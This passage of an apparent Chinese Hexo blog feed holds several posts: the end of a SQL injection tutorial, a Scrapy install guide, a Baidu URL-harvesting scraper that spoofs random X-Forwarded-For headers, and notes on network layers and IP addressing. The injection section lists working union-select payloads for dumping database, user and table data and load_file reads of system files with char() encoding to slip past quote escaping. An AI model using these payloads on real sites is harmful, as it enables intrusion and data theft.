class="line">下列字符受影响：</span><br><span class="line">【\x00】：空字符</span><br><span class="line">【\n】：换行</span><br><span class="line">【\r】：回车</span><br><span class="line">【\】：转义字符</span><br><span class="line">【’】：单引号</span><br><span class="line">【“】：双引号</span><br><span class="line">【\x1a】：代替</span><br><span class="line"></span><br><span class="line">注:  \x :指16进制</span><br></pre></td></tr></table></figure></p><p>load_file函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">只有满足两个条件就可以使用： </span><br><span class="line">1、文件权限：chmod a+x pathtofile</span><br><span class="line">2、文件大小: 必须小于max_allowed_packet</span><br><span class="line">在数据库注入中、可以使用该函数去读取相关文件内容</span><br><span class="line"></span><br><span class="line">我们假设一个程序的SQL语句如下：</span><br><span class="line">select * from article where articleid=$id</span><br><span class="line"> (当前条件：magic_quotes_gpc = off, c:/boot.ini可读）</span><br><span class="line">此时，我们构造$id为：-1 union select 1,1,1,1,load_file(&apos;c:/boot.ini’)</span><br><span class="line">查询语句就变成：</span><br><span class="line">select * from article where articleid=-1 union select 1,1,1,1,load_file(&apos;c:/boot.ini’)</span><br><span class="line"></span><br><span class="line">如果 magic_quotes_gpc = on时</span><br><span class="line">我们可以用char()函数或者把字符转换成16进制。</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</span><br><span class="line">char()：获取对应数值的字符、参照ascii码</span><br></pre></td></tr></table></figure></p><p>Into dumpfile()和outfile()函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">只有满足两个条件就可以使用： </span><br><span class="line">首先通过命令 select * from test into outfile &apos;/tmp/test.txt&apos; 来使用outfile导出</span><br><span class="line">得到文件 /tmp/test.txt 文件中保存了所有的数据并且在一行数据的末尾自动换行。</span><br><span class="line"></span><br><span class="line">使用命令 select * from test into dumpfile &apos;/tmp/test.txt&apos; 使用dumpfile进行导出</span><br><span class="line">通过dumpfile导出的数据行数据之间并未进行换行且只导出了部分数据。</span><br><span class="line">dumpfile对文件内容是原意写入，未做任何转移和增加。</span><br></pre></td></tr></table></figure></p><h3 id="注入常用实例"><a href="#注入常用实例" class="headerlink" title="注入常用实例"></a>注入常用实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">永真式：最后加入 or 1=1 来保证无论如何都能获取数据。</span><br><span class="line">错误语句：让Web应用构造错误的SQL语句来抛异常，来判断数据库类型</span><br><span class="line">结束注释：使用注释符注释剩余语句</span><br><span class="line">联合查询：使用union all，后面可以写我要查询的真正语句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1’order by 2 -- /* 用来猜查询信息的列数/</span><br><span class="line">1’and 1=2 union select user(),database(),version(); -- /* 获取数据库信息/</span><br><span class="line">1’and 1=2 union select 1,@@global.version_compile_os from mysql.user -- /*获得操作系统信息</span><br><span class="line">1’and ord(mid(user(),1,1))=114 --  /*测试连接数据库用户权限</span><br><span class="line">1&apos; and 1=2 union select 1,schema_name from information_schema.schemata -- /*爆出所有数据库名称</span><br><span class="line">1&apos; and exists(select * from users) -- /*猜解表名</span><br><span class="line">1&apos; and exists(select first_name from users) -- /猜解字段名</span><br><span class="line">1&apos; and 1=2 union select first_name,last_name from users -- /*猜解字段内容</span><br><span class="line">http://127.0.0.1/day6/1.php?id=1 union select 1,name,pass from admin 数字型</span><br><span class="line">   数字型不用特意加字符，直接 and1=2检测是否有注入点；</span><br><span class="line">Select  1,2,3 ,4   数字代表占位，可以往里放要查询的数据</span><br></pre></td></tr></table></figure><h3 id="判断网站的数据库类型"><a href="#判断网站的数据库类型" class="headerlink" title="判断网站的数据库类型"></a>判断网站的数据库类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.Access一般用在小网站上，类似企业站，功能比较简单，对数据要求不高；</span><br><span class="line"> 2、Mssql是一个比较大的完善的数据库，在windows上常用,配NET ASP等程序。 </span><br><span class="line">3、Mysql是一个小型的公开源代码的免费数据库，在windows，linux上都常用，和PHP程序组成一对完美搭档。</span><br><span class="line">ASP和.NET：Microsoft SQL Server</span><br><span class="line">PHP：MySQL、PostgreSQL</span><br><span class="line">Java：Oracle、MySQL</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python3.7 安装scrapy框架</title>
    <link href="http://yoursite.com/2018/09/02/Python3-7%E5%AE%89%E8%A3%85scrapy%E6%A1%86%E6%9E%B6/"/>
    <id>http://yoursite.com/2018/09/02/Python3-7安装scrapy框架/</id>
    <published>2018-09-02T07:32:45.000Z</published>
    <updated>2018-09-02T14:14:00.238Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>安装scrapy爬虫框架</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python 3.7</span><br><span class="line">windows 8.1 x64位</span><br></pre></td></tr></table></figure><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>在命令行下输入<code>pip install scrapy</code><br>报错，提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">microsoft visual c++ 14.0 is required</span><br><span class="line">twisted is required</span><br></pre></td></tr></table></figure></p><h4 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h4><h5 id="升级pip："><a href="#升级pip：" class="headerlink" title="升级pip："></a>升级pip：</h5><p><code>python -m pip install --upgrade pip</code><br>如果已经是最新的，可以略过这一步</p><h5 id="安装-microsoft-visual-c-14-0"><a href="#安装-microsoft-visual-c-14-0" class="headerlink" title="安装 microsoft visual c++ 14.0"></a>安装 microsoft visual c++ 14.0</h5><p>下载网址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://visualstudio.microsoft.com/downloads/?rr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DFkkrTc4jgi8McqJvBvl3DAreZXK4qM6ctZqszBy3NThiXmxsy8UIboRgnBY5oBNGOcfoPYESqoRiz2TYq1nFm_%26ie%3Dutf-8%26f%3D8%26tn%3Dmonline_3_dg%26wd%3Dvisual%2520studio%25E4%25B8%258B%25E8%25BD%25BD%26oq%3Dpython%2525E7%252588%2525AC%2525E5%25258F%252596%2525E5%2525A6%2525B9%2525E5%2525AD%252590%2525E5%25259B%2525BE%2525E7%252589%252587%26rqlang%3Dcn%26inputT%3D8064%26sug%3Dvisual%252520studio</span><br></pre></td></tr></table></figure></p><p><img src="\images\pasted-185.png" alt="upload successful"><br>然后下载对应的操作系统版本即可，安装下一步即可</p><h5 id="安装wheel"><a href="#安装wheel" class="headerlink" title="安装wheel"></a>安装wheel</h5><p><code>pip install wheel</code><br>安装完，在命令行下输入wheel，看到下面结果即为成功：</p><p><img src="\images\pasted-187.png" alt="upload successful"></p><h5 id="安装对应版本的Twisted"><a href="#安装对应版本的Twisted" class="headerlink" title="安装对应版本的Twisted"></a>安装对应版本的Twisted</h5><p>下载网址：<br><code>https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</code></p><p><img src="\images\pasted-186.png" alt="upload successful"><br>注: cp37中的37代表python3.7版本，win后面代表操作系统的版本，笔者的是64位系统，以及python3.7版本，自行选择32 或者64位。<br>安装时，运行cmd，输入pip install + 文件路径 即可。</p><p>如：<br><code>pip install C:\Users\name\Downloads\Twisted-18.7.0-cp37-cp37m-win_amd64.whl</code></p><h5 id="安装Lxml"><a href="#安装Lxml" class="headerlink" title="安装Lxml"></a>安装Lxml</h5><p>下载网址:<br><code>https://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml</code></p><p><img src="\images\pasted-188.png" alt="upload successful"><br>注: cp37中的37代表python3.7版本，win后面代表操作系统的版本，笔者的是64位系统，以及python3.7版本，自行选择32 或者64位。<br>安装方法同安装Twisted</p><h5 id="安装Pywin32"><a href="#安装Pywin32" class="headerlink" title="安装Pywin32"></a>安装Pywin32</h5><p>下载网址：<br><code>https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</code><br>切记要下载对应的python版本和对应的操作系统</p><p><img src="\images\pasted-189.png" alt="upload successful"><br>安装直接下一步即可</p><h5 id="安装scrapy框架"><a href="#安装scrapy框架" class="headerlink" title="安装scrapy框架"></a>安装scrapy框架</h5><p>安装完以上几项之后，在cmd里输入<br><code>pip install scrapy</code></p><p><img src="\images\pasted-190.png" alt="upload successful"><br>安装完毕，cmd里输入scrapy出现安装成功</p><p><img src="\images\pasted-191.png" alt="upload successful"></p><p>至此，Python3.7和对应的scrapy安装完毕</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>URL采集</title>
    <link href="http://yoursite.com/2018/09/01/URL%E9%87%87%E9%9B%86/"/>
    <id>http://yoursite.com/2018/09/01/URL采集/</id>
    <published>2018-09-01T15:34:45.000Z</published>
    <updated>2018-09-01T15:43:30.371Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="爬取目标"><a href="#爬取目标" class="headerlink" title="爬取目标"></a>爬取目标</h1><p>通过百度爬取url，并保存在文本中，供后续使用</p><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>python 3.7</p><h1 id="使用的库"><a href="#使用的库" class="headerlink" title="使用的库"></a>使用的库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup as bs</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br></pre></td></tr></table></figure><h1 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup as bs</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    try:</span><br><span class="line">     for i in range(0,750,10):   #遍历页数，每次增加10</span><br><span class="line">        url = &apos;https://www.baidu.com/s?wd=芒果&amp;pn=%s&apos;%(str(i))  # 定义url</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0&apos;,</span><br><span class="line">            &apos;X - Forwarded - For&apos;: &apos;% s&apos;</span><br><span class="line">        &#125;  # 百度的防爬机制，需要加header头的user-agent</span><br><span class="line"></span><br><span class="line">        random_ip = socket.inet_ntoa(struct.pack(&apos;&gt; I&apos;, random.randint(1, 0xffffffff)))</span><br><span class="line">        headers[&quot;X - Forwarded - For&quot;] = random_ip  #随机IP，防止连接问题</span><br><span class="line">        r = requests.get(url=url, headers=headers)  # 请求网址</span><br><span class="line">        soup = bs(r.content, &apos;lxml&apos;)  # 用bs解析网址</span><br><span class="line">        urls = soup.find_all(name=&apos;a&apos;,attrs=&#123;&quot;data-click&quot;:re.compile((&apos;.&apos;)),&apos;class&apos;:None&#125;)</span><br><span class="line">        #用re取出a标签里的所有内容，class：none是为了不取百度快照</span><br><span class="line">        for url in urls:</span><br><span class="line">            r_get_url = requests.get(url = url[&apos;href&apos;],headers = headers,timeout =10)  #请求所抓的url，设置超时为10秒</span><br><span class="line">            requests.adapters.DEFAULT_RETRIES = 10    #增加重试连接次数</span><br><span class="line">            if r_get_url.status_code == 200:</span><br><span class="line">                url_par = r_get_url.url</span><br><span class="line">                url_index_tmp = url_par.split(&apos;/&apos;)</span><br><span class="line">                url_index = url_index_tmp[0]+&apos;//&apos;+url_index_tmp[2]</span><br><span class="line">                with open(&apos;D:/cs.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">                    if url_index not in f.read():  #进行一个去重判断</span><br><span class="line">                        print(url_index)</span><br><span class="line">                        f2 = open(&apos;D:/cs.txt&apos;,&apos;a+&apos;)</span><br><span class="line">                        f2.write(url_index+&apos;\n&apos;)</span><br><span class="line">                        f2.close()</span><br><span class="line">    except requests.ConnectionError as e:</span><br><span class="line">        return &apos;网络问题&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    f2 = open(&apos;D:/cs.txt&apos;,&apos;w&apos;)</span><br><span class="line">    f2.close()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络基础知识</title>
    <link href="http://yoursite.com/2018/08/31/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80-%E4%B8%83%E5%B1%82/"/>
    <id>http://yoursite.com/2018/08/31/网络基础-七层/</id>
    <published>2018-08-31T14:07:05.000Z</published>
    <updated>2018-08-31T15:04:45.637Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-179.png" alt="upload successful"></p><h1 id="1-网络层次划分"><a href="#1-网络层次划分" class="headerlink" title="1.网络层次划分"></a>1.网络层次划分</h1><p>为了使不同计算机厂家生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978年提出了“开放系统互联参考模型”，即著名的OSI/RM模型（Open System Interconnection/Reference Model）。它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层（Physics Layer）、数据链路层（Data Link Layer）、网络层（Network Layer）、传输层（Transport Layer）、会话层（Session Layer）、表示层（Presentation Layer）、应用层（Application Layer）。其中第四层完成数据传送服务，上面三层面向用户。</p><p>　　除了标准的OSI七层模型以外，常见的网络层次划分还有TCP/IP四层协议以及TCP/IP五层协议，它们之间的对应关系如下图所示：</p><p><img src="\images\pasted-181.png" alt="upload successful"></p><h1 id="2-OSI七层网络模型"><a href="#2-OSI七层网络模型" class="headerlink" title="2.OSI七层网络模型"></a>2.OSI七层网络模型</h1><p>TCP/IP协议毫无疑问是互联网的基础协议，没有它就根本不可能上网，任何和互联网有关的操作都离不开TCP/IP协议。不管是OSI七层模型还是TCP/IP的四层、五层模型，每一层中都要自己的专属协议，完成自己相应的工作以及与上下层级之间进行沟通。由于OSI七层模型为网络的标准层次划分，所以以OSI七层模型为例从下向上进行介绍。</p><p><img src="\images\pasted-182.png" alt="upload successful"></p><h3 id="物理层（Physical-Layer）"><a href="#物理层（Physical-Layer）" class="headerlink" title="物理层（Physical Layer）"></a>物理层（Physical Layer）</h3><p>激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，<code>中继器（Repeater，也叫放大器）和集线器</code></p><h3 id="数据链路层（Data-Link-Layer）"><a href="#数据链路层（Data-Link-Layer）" class="headerlink" title="数据链路层（Data Link Layer）"></a>数据链路层（Data Link Layer）</h3><p>数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。</p><p>　　有关数据链路层的重要知识点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　 数据链路层为网络层提供可靠的数据传输；</span><br><span class="line"> </span><br><span class="line">　　 基本数据单位为帧；</span><br><span class="line"></span><br><span class="line">　   主要的协议：以太网协议；</span><br><span class="line"></span><br><span class="line">　   两个重要设备名称：网桥和交换机。</span><br></pre></td></tr></table></figure></p><h3 id="网络层（Network-Layer）"><a href="#网络层（Network-Layer）" class="headerlink" title="网络层（Network Layer）"></a>网络层（Network Layer）</h3><p>　　网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果您想用尽量少的词来记住网络层，那就是“路径选择、路由及逻辑寻址”。</p><p>　　网络层中涉及众多的协议，其中包括最重要的协议，也是TCP/IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。具体的协议会在接下来的部分进行总结，有关网络层的重点为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">　　1&gt; 网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能；</span><br><span class="line"></span><br><span class="line">　　2&gt; 基本数据单位为IP数据报；</span><br><span class="line"></span><br><span class="line">　　3&gt; 包含的主要协议：</span><br><span class="line"></span><br><span class="line">　　IP协议（Internet Protocol，因特网互联协议）;</span><br><span class="line"></span><br><span class="line">　　ICMP协议（Internet Control Message Protocol，因特网控制报文协议）;</span><br><span class="line"></span><br><span class="line">　　ARP协议（Address Resolution Protocol，地址解析协议）;</span><br><span class="line"></span><br><span class="line">　　RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。</span><br><span class="line"></span><br><span class="line">　　4&gt; 重要的设备：路由器。</span><br></pre></td></tr></table></figure></p><h3 id="传输层（Transport-Layer）"><a href="#传输层（Transport-Layer）" class="headerlink" title="传输层（Transport Layer）"></a>传输层（Transport Layer）</h3><p>第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供<code>端到端的、可靠的或不可靠的传输</code>。此外，传输层还要处理端到端的差错控制和流量控制问题。</p><p>　　传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。</p><p>　　网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。</p><p>　　有关网络层的重点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　1&gt; 传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题；</span><br><span class="line"></span><br><span class="line">　　2&gt; 包含的主要协议：TCP协议（Transmission Control Protocol，传输控制协议）、UDP协议（User Datagram Protocol，用户数据报协议）；</span><br><span class="line"></span><br><span class="line">　　3&gt; 重要设备：网关。</span><br></pre></td></tr></table></figure></p><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>　　会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>　　表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。</p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>　　为操作系统或网络应用程序提供访问网络服务的接口。</p><p>　　会话层、表示层和应用层重点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　1&gt; 数据传输基本单位为报文；</span><br><span class="line"></span><br><span class="line">　　2&gt; 包含的主要协议：FTP（文件传送协议）、Telnet（远程登录协议）、DNS（域名解析协议）、SMTP（邮件传送协议），POP3协议（邮局协议），HTTP协议（Hyper Text Transfer Protocol）。</span><br></pre></td></tr></table></figure></p><h1 id="3-IP地址"><a href="#3-IP地址" class="headerlink" title="3.IP地址"></a>3.IP地址</h1><h4 id="1）网络地址"><a href="#1）网络地址" class="headerlink" title="1）网络地址"></a>1）网络地址</h4><p>　　IP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。</p><h4 id="2）广播地址"><a href="#2）广播地址" class="headerlink" title="2）广播地址"></a>2）广播地址</h4><p>　　广播地址通常称为直接广播地址，是为了区分受限广播地址。</p><p>　　广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1。当向某个网络的广播地址发送消息时，该网络内的所有主机都能收到该广播消息。</p><h4 id="3）组播地址"><a href="#3）组播地址" class="headerlink" title="3）组播地址"></a>3）组播地址</h4><p>　　D类地址就是组播地址。</p><p>　　先回忆下A，B，C，D类地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">　　A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255；</span><br><span class="line"></span><br><span class="line">　　B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255;</span><br><span class="line"></span><br><span class="line">　　C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。</span><br><span class="line"></span><br><span class="line">　　D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）；</span><br><span class="line"></span><br><span class="line">　　E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</span><br><span class="line"></span><br><span class="line">　　注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。</span><br></pre></td></tr></table></figure></p><h4 id="4）255-255-255-255"><a href="#4）255-255-255-255" class="headerlink" title="4）255.255.255.255"></a>4）255.255.255.255</h4><p>　　该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。例如：主机192.168.1.1/30上的直接广播数据包后，另外一个网段192.168.1.5/30也能收到该数据报；若发送受限广播数据报，则不能收到。</p><p>　　注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。</p><h4 id="5）0-0-0-0"><a href="#5）0-0-0-0" class="headerlink" title="5）0.0.0.0"></a>5）0.0.0.0</h4><p>　　常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由器屏蔽的范围内）的服务器发送IP请求分组。</p><h4 id="6）回环地址"><a href="#6）回环地址" class="headerlink" title="6）回环地址"></a>6）回环地址</h4><p>　　127.0.0.0/8被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是127.0.0.1。</p><h4 id="7）A、B、C类私有地址"><a href="#7）A、B、C类私有地址" class="headerlink" title="7）A、B、C类私有地址"></a>7）A、B、C类私有地址</h4><p>　　私有地址(private address)也叫专用地址，它们不会在全球使用，只在本地局域网内使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255</span><br><span class="line"></span><br><span class="line">　　B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255</span><br><span class="line"></span><br><span class="line">　　C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255</span><br></pre></td></tr></table></figure><h1 id="4-子网掩码及网络划分"><a href="#4-子网掩码及网络划分" class="headerlink" title="4. 子网掩码及网络划分"></a>4. 子网掩码及网络划分</h1><p>　　随着互连网应用的不断扩大，原先的IPv4的弊端也逐渐暴露出来，即网络号占位太多，而主机号位太少，所以其能提供的主机地址也越来越稀缺，目前除了使用NAT在企业内部利用保留地址自行分配以外，通常都对一个高类别的IP地址进行再划分，以形成多个子网，提供给不同规模的用户群使用。</p><p>　　这里主要是为了在网络分段情况下有效地利用IP地址，通过对主机号的高位部分取作为子网号，从通常的网络位界限中扩展或压缩子网掩码，用来创建某类地址的更多子网。但创建更多的子网时，在每个子网上的可用主机地址数目会比原先减少。</p><h4 id="什么是子网掩码？"><a href="#什么是子网掩码？" class="headerlink" title="什么是子网掩码？"></a>什么是子网掩码？</h4><p>　　子网掩码是标志两个IP地址是否同属于一个子网的，也是32位二进制地址，其每一个为1代表该位是网络位，为0代表主机位。它和IP地址一样也是使用点式十进制来表示的。如果两个IP地址在子网掩码的按位与的计算下所得结果相同，即表明它们共属于同一子网中。</p><p>　　在计算子网掩码时，我们要注意IP地址中的保留地址，即“ 0”地址和广播地址，它们是指主机地址或网络地址全为“ 0”或“ 1”时的IP地址，它们代表着本网络地址和广播地址，一般是不能被计算在内的。</p><h4 id="子网掩码的计算："><a href="#子网掩码的计算：" class="headerlink" title="子网掩码的计算："></a>子网掩码的计算：</h4><p>　　对于无须再划分成子网的IP地址来说，其子网掩码非常简单，即按照其定义即可写出：如某B类IP地址为 10.12.3.0，无须再分割子网，则该IP地址的子网掩码255.255.0.0。如果它是一个C类地址，则其子网掩码为 